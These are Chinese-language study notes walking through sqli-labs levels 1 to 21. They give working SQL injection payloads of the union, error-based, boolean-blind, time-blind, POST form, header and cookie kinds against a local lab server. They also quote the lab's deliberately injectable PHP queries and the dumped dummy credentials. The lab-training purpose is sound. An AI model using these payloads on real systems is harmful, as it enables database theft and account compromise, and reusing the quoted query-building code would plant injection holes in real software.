### Sqli-labs



##### 1. less-1,single quotes - String

显示位置在2,3号

http://192.168.217.113:7766/Less-1/?id=1' union select 1,2,3 limit 1,1 --+

```sql
// 查询库名： 
(select group_concat(schema_name) from information_schema.schema)
// 查询表名： 
(select group_concat(table_name) from information_schema.tables where table_schema='security')
// 查询表内列名： 
(select group_concat(column_name) from information_schema.columns where table_name='users')
// 爆破所有数据: 
(select group_concat(username) from security.users) ,  (select group_concat(password) from security.users)
```





##### 2. Less-2, - integer

http://192.168.217.113:7766/Less-1/?id=1 union select 1,2,3 limit 1,1 --+

整型和字符型的区别  在于需不需要提前使用`'`进行截断

```php
// 字符串型
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
// 整型
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```



##### 3. Less-3,Single quotes with twist - String

http://192.168.217.113:7766/Less-1/?id=1') union select 1,2,3 limit 1,1 --+

上面的方式不能生效了，对比之后多了个`()`，因此需要补全括号，否则永远被括号括起来，最后结果还是逃不掉最后的limit

```php
$sql="SELECT * FROM users WHERE id=('$id') LIMIT 0,1";
```



##### 4. Less-4,Double Quotes - String

http://172.16.51.129:7766/Less-4/?id=1") union select 1,2,3 limit 1,1 --+

 使用`""`对查询内容进行拼接，并且放在了`()`中。

```php
$id = '"' . $id . '"';
$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";

```



##### 5. Less-5,Single Quote - String

http://172.16.51.129:7766/Less-5/?id=1'

从输出可知（无回显），页面只会展示成功或失败的逻辑，但是输入`1'`会输出错误，则可以使用错误注入

```sql
// undatexml 存在返回长度为32，因此需要使用substr，一段一段去获取
// 查询库名
and (updatexml(1,concat(0x7e, substr((select group_concat(schema_name) from information_schema.schema),64,32 ),0x7e),1));
// 结果： information_schema,challenges,mysql,performance_schema,security
// 查询表名
and (updatexml(1,concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema="security") ,0x7e),1));
// 结果：emails,referers,uagents,users
// 查询列名
and (updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name="users") ,0x7e),1));
// 结果： id,username,password
// 爆破数据
and (updatexml(1,concat(0x7e, substr((select group_concat(username) from security.users),1,32 ),0x7e),1));
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
and (updatexml(1,concat(0x7e, substr((select group_concat(password) from security.users),1,32 ),0x7e),1));
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```



##### 6. Double Quotes -String

尝试加`'`,`"`，在使用双引号的时候，会有回显

http://172.16.104.130:7766/Less-6/?id=1"



##### 7. Dump Into outfield - String

没有回显，而且感觉会根据sql查询结果，如果查询失败，就页面显示失败不是调用`sql_error()`那种，成功就展示成功语句。应该只能使用布尔。

有点贱，用了两个`()`

```php
$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";	
```

http://172.16.104.130:7766/Less-7/?id=1')) and 1=1 跟 1=2 ，会有正确或错误返回。

**ps：**别人答案是使用outfile写shell？





##### 8. Boolian Based - Single Quotes

这题只有成功会显示，失败就啥东西都没有，很恶心。

并且在你构造语句的时候，在处理完`'`之后，需要在语句结尾补齐`;`否则还是会语句有错。

之后的是就是布尔。

```php
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";	
```

```sql
// 判断库名长度  使用Burp Suite爆破，步长1,循环判断长度
and (length(database() = 8)); --+
// 判断库名  使用Burp Suite爆破，步长1，循环判断字符内容。
and (substr(database(),1,1)='a'); --+
// 结果： security
// 判断表名长度
and (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))) = 6 --+
// 爆破表名
and (substr( (select table_name from information_schema.tables where table_schema=database() limit 0,1), 1,1 ) = 'a') --+
// 结果：emails,referers,uagents,users
// 爆破user表列名
and (substr( (select column_name from information_schema.columns where table_name="users" limit 0,1),1,1 )='a'); --+
// 结果： id,username,password
// 爆破user数据
and (substr( (select username from users limit 0,1),1,1 ) = 'a');--+
and (substr( (select password from users limit 0,1),1,1 ) = 'a');--+
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```







##### 9. Bind - Time Based - Singe Quote

无论成功，还是失败，返回的内容都是一样的，绝望。。。只能使用最蠢的时间。

```sql
// 判断库名  使用Burp Suite爆破，步长1，根据响应返回结果长度筛选
and if( substr(database(),1,1), sleep(5), 1); --+	
// 爆破表名 
and if( substr( (select group_concat(table_name) from information_schema.tables where table_schema=database() ),1,1)='e',sleep(5),1); --+
// 结果：emails,referers,uagents,users
// 爆破users列名
and if( substr( (select group_concat(column_name) from information_schema.columns where table_name="users"),1,1)='i', sleep(5),1); --+
// 结果： id,username,password
// 爆破users数据
and if( substr( (select group_concat(username) from security.users),1,1)='d',sleep(5),1); --+
and if( substr( (select group_concat(password) from security.users),1,1)='d',sleep(5),1); --+
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```



##### 10. Blind - Time Based - Double Quote

这种引号的使用方式，是真的太骚了。

**ps：**需要补一下php的编码格式，这里是等于输入`""`指定id

```php
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";
```

```sql
/Less-10/?id=1" and if(1=1,sleep(5),1); --+
```



##### 11. Error Based - Single quotes - String

题目是一个登录页面，因此可能不是简单的get请求，修改url请求地址就能做到注入，尝试先抓包看看登录的时候的请求。

Burp Suite中可以看到，点击登录的时候，发起了一个`Post`请求。

从源码中，可以看到对`Post`表单中数据的拼接使用。

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

因此，我只需要在Burp Suite中，截获post请求的表单，对`uname`字段进行注入即可。

```sql
// 获取库名 
xx'uname=-qing' union select 1,database()##&passwd=1&submit=Submit 
// 结果: security
// 获取表名  
xx'uname=-1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database())#&passwd=1&submit=Submit
// 结果： emails,referers,uagents,users
// 获取users表列名
xx'uname=-1' union select 1,(select group_concat(column_name) from information_schema.columns where table_name='users')#&passwd=1&submit=Submit
// 结果:id,username,password
// 爆破user表内容
xx'uname=-1' union select 1,(select group_concat(username) from security.users)#&passwd=1&submit=Submit
xx'uname=-1' union select 1,(select group_concat(password) from security.users)#&passwd=1&submit=Submit
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```



##### 12. Error Based - Double quotes - String - with twist

又遇上特殊组合

```php
$uname='"'.$uname.'"'
$passwd='"'.$passwd.'"'
@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

因此破解需要使用`")`

```sql
xx("uname=-1") union select 1,2 ##&passwd=admin&submit=Submit
```



##### 13.  Double Injection - Single quotes - String - With twist

输出成功的账号密码，只看到一张成功登录的图片，猜想失败也是更换失败的图片。然后试了一下账号名使用`admin'#`，尝试进行破坏账号密码查询结构，出现错误返回信息。因此猜测错误的时候会有`sql_error()`函数调用。所以不能用成功登录的回显作为注入点，需要使用错误注入，用报错的回显获取信息。

 查看源码：

```php
@$sql="SELECT username, password FROM users WHERE username=('$uname') and password=('$passwd') LIMIT 0,1";
```

```sql
// 查看库名
xx('uname=1') and updatexml(1,concat(0x7e,database(),0x7e),1) #&passwd=admin&submit=Submit
// 结果： XPATH syntax error: '~security~'
// 查看表名
xx('uname=1') and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) #&passwd=admin&submit=Submit
// 结果：XPATH syntax error: '~emails,referers,uagents,users~'
// 爆破users表列名
xx('uname=1') and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'),0x7e),1) #&passwd=admin&submit=Submit
// 结果：XPATH syntax error: '~id,username,password~'
// 爆破users表数据
xx('uname=1') and updatexml(1,concat(0x7e,substr((select group_concat(username) from security.users),1,30),0x7e),1) #&passwd=admin&submit=Submit
xx('uname=1') and updatexml(1,concat(0x7e,substr((select group_concat(password) from security.users),1,30),0x7e),1) #&passwd=admin&submit=Submit
/* username：
(1,30)   XPATH syntax error: '~Dumb,Angelina,Dummy,secure,stu~'
(31,30)  XPATH syntax error: '~pid,superman,batman,admin,admi~'
(61,30)  XPATH syntax error: '~n1,admin2,admin3,dhakkan,admin~'
(91,30)  XPATH syntax error: '~4~'</br>
*/
/* password结果：
(1,30)   XPATH syntax error: '~Dumb,I-kill-you,p@ssword,crapp~'
(31,30)  XPATH syntax error: '~y,stupidity,genious,mob!le,adm~'
(61,30)  XPATH syntax error: '~in,admin1,admin2,admin3,dumbo,~'
(91,30)  XPATH syntax error: '~admin4~'</br>
*/
```



##### 14. Double Injection - Single quotes - String - with twist

和13题开始类似，只不过这里就成了当初的预计，只有成功和失败的图片返回，不会有有用的回显。那只能用`时间注入`.

鹅，搞错了，原来`"`能导致你传进去的`'`被括起来，并且你用多个`"`也不会进行报错，你需要先用`"`对之前的进行封闭，然后再输入一个`'`才会造成报错.

```php
$uname='"'.$uname.'"';
$passwd='"'.$passwd.'"'; 
@$sql="SELECT username, password FROM users WHERE username=$uname and password=$passwd LIMIT 0,1";
```

所以注入语句，和上一题的区别只是双引号`"`



##### 15. Blind - Boolean/time Based - Single quotes

这道题，就成了上面的预想，就是无论输入什么，就只有成功和失败的图片的返回，连错误的返回都没有。那就只能用时间注入。

```php
@$sql="SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1";
```

鹅，原来还没到，两张图的名字不是一样的。还能继续用布尔，只不过需要用`or`来进行条件匹配，可以构造`uname`和`passwd`，用`or`在两个语句里面拼接，造成`passwd`的条件永真，而`uname`的条件则可以用来判断内容是否为真.

```sql
// 爆破库名    这里的拼接中#号能把后面的'给注释掉？
xx'uname=' or substr(database(),1,1)='s'#
xx'passwd=' or 1=1#
// 结果: security
// 爆破表名
xx'uname=' or substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1)='s'#
// 结果：emails,referers,uagents,users
// 爆破user表列名
xx'uname=' or substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,1)='s'#
// 结果:id,username,password
// 爆破user表数据
xx'uname=' or substr((select group_concat(username) from security.users),1,1)='s'#
xx'uname=' or substr((select group_concat(password) from security.users),1,1)='s'#
/* 
结果： name： 
Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,admin3,dhakkan,admin4'
*/
/*
结果： password：
Dumb,I-kill-you,p@ssword,crappyy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4
*/
```





##### 16. Blind- Boolean/Time Based - Double quotes

看了题目，感觉是用`"`进行截断.

```php
	$uname='"'.$uname.'"';
	$passwd='"'.$passwd.'"'; 
	@$sql="SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1";
```

因此只是将截断变成`")` 即可，即：

```sql
xx("uname=") or  1=1#
xx("passwd=") or 1=1#
```





##### 17. Update Query-Error Based - String

看界面，应该是一个`二次注入`的例子

又猜错，是一个`update注入`的例子，即简单闭合`update`sql语句。

**PS：**要注入截断后使用什么字符， 貌似在刚才的注入过程中使用了`#`,导致users表中的密码都成了空白。

因为在`UPDATE`语句中，我直接使用了'/'进行截断，导致所有的数据，都变成空白。

**如果使用`or '`,则能延续后面WHERE的条件限制，这样才不会改变语句执行的语义。**

```php
/*
源码的update操作有两步：
1. 根据用户名查询到对应行数据
2. 根据输入密码，更新行数据到数据库中。而且只有第二步中的更新会有错误回显。
*/

@$sql="SELECT username, password FROM users WHERE username= $uname LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);
//echo $row;
	if($row)
	{
  		//echo '<font color= "#0000ff">';	
		$row1 = $row['username'];  	
		//echo 'Your Login name:'. $row1;
		$update="UPDATE users SET password = '$passwd' WHERE username='$row1'";
		mysql_query($update);
    if (mysql_error())
		{
			print_r(mysql_error());
		}else {
      // 成功 
    }
  }else { 
    // 失败
  }

```

```sql
// 爆破库名	 //passwd的''要去掉一个
uname=admin&passwd='' or updatexml(1,substr(concat(0x7e,database(),0x7e),1,30),1)#$submit=Submit 
// 爆破表名
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,30),0x7e),1)#$submit=Submit
// 爆破users表列名
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name='users'),1,30),0x7e),1)#$submit=Submit
// 爆破users表内容
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(username) from security.users),1,30),0x7e),1)#$submit=Submit
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(password) from security.users),1,30),0x7e),1)#$submit=Submit

```

上面爆破库，表，列，都是顺利的， 到了爆破表数据的时候，就报错`You can't specify target table 'users' for update in FROM clause`.原因是,**在同一条SQL语句中，不允许先SELECT出同一个表中的某些值，再对该表进行UPDATE操作**，其中原理类似于读写锁，取出来的数据可能被后来update 的操作污染。

解决的办法有：

- 在SELECT时，多嵌套一层子查询，即把SELECT出来的结果作为中间表再SELECT一次，
- 创建一个临时新的表，然后根据临时表来UPDATE表中的数据，最后再把临时表删除。这个在注入中不好操作。

```sql
// 使用方法一解决，将查询的内容构造成列，然后再查询一次。
select group_concat(t.username) from ((select username from security.users)t)
select group_concat(t.password) from ((select password from security.users)t)
// 完整的查询语句
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(t.username) from ((select username from security.users)t)),1,30),0x7e),1)#$submit=Submit
uname=admin&passwd='' or updatexml(1,concat(0x7e,substr((select group_concat(t.password) from ((select password from security.users)t)),1,30),0x7e),1)#$submit=Submit
```



##### 18. Header Injection - Uagent field - Error based

基于http请求头的`User-Agent`注入

看到解释，是从http请求头进行注入，我在想为什么不能body进行呢，看了一下源码。

根据body的用户名和密码进行查询，只有查询到，才会执行insert插入语句.因此只能在http请求头进行注入，

```php
$uagent = $_SERVER['HTTP_USER_AGENT'];
$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
    	}else {}
```

注入的语句和上面17题的简单注入即可。

```sql
// 看了源码，尝试爆破uagent表
'qing' or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='uagents'),0x7e),0) or ''
// 结果：XPATH syntax error: '~id,uagent,ip_address,username~'
// 爆破这个表的意义不大， 因为我是输入账号密码进来的，意义还是爆破其他的表。
'qing' or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),0) or ''
// 结果：XPATH syntax error: '~emails,referers,uagents,users~'
```



##### 19. Header Injection - Referer field - Error based

看了源码，就是将注入的地方改成了http请求头的`Referer`字段

```php
	$uagent = $_SERVER['HTTP_REFERER'];
	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
		if($row1)
			{
			$insert="INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')";
			}else {}
```

注入代码如上题目。



##### 20. Cookie injections - Uagent field - error based

看题目应该是cookie字段注入了。

```php
if(!isset($_COOKIE['uname'])) {
	$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
	$result1 = mysql_query($sql);
	$row1 = mysql_fetch_array($result1);
	$cookee = $row1['username'];
  if($row1)
			{
    		// 将查询到的信息，写入到的cookie中。
				setcookie('uname', $cookee, time()+3600);	
     	}	
 else {
   	if(!isset($_POST['submit']))
		{
      // 下次网页刷新，直接取出cookie的uname字段去查找，并且存在报错输出语句。
			$cookee = $_COOKIE['uname'];
      $sql="SELECT * FROM users WHERE username='$cookee' LIMIT 0,1";
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
      if($row) {} else {}
    }
 } 

	
```

因此，只需要在http请求头中，对cookie字段进行uname参数的进行报错注入即可。

```sql
// 都是不需要闭合的'' ，
// 爆破库名
Cookie: 'uname=' and updatexml(1,concat(0x7e,database(),0x7e),1)#
// 爆破表名
Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(table_name) from information_schema.tables where table_schema=database()),1,30 ),0x7e),1)#
// 爆破表列名
Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(column_name) from information_schema.columns where table_name='users'),1,30 ),0x7e),1)#
// 爆破users表数据
Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(username) from security.users),1,30 ),0x7e),1)#
Cookie: 'uname=' and updatexml(1,concat(0x7e,substr( (select group_concat(password) from security.users),1,30 ),0x7e),1)#
```



##### 21. Cookie injections - Uagent field - error based

```php
if(!isset($_COOKIE['uname'])){
  		$sql="SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1";
			$result1 = mysql_query($sql);
			$row1 = mysql_fetch_array($result1);
			if($row1) {
        setcookie('uname', base64_encode($row1['username']), time()+3600);	
      } else {}
} esle {
  	if(!isset($_POST['submit']))
		{
      $cookee = base64_decode($cookee);
			$sql="SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1";
			$result=mysql_query($sql);
			if (!$result)
  				{
  				die('Issue with your mysql: ' . mysql_error());
  				}
			$row = mysql_fetch_array($result);
			if($row) {} else {}
    }
}
```

看源码，会对查询到的数据库信息进行`base64_encode`，然后再插入cookie字段中。而取出来的cookie，也是需要先经过`base_decode`，因此注入到cookie的代码，需要先进过`base64_encode`。

噢！还要**注意闭合**！！

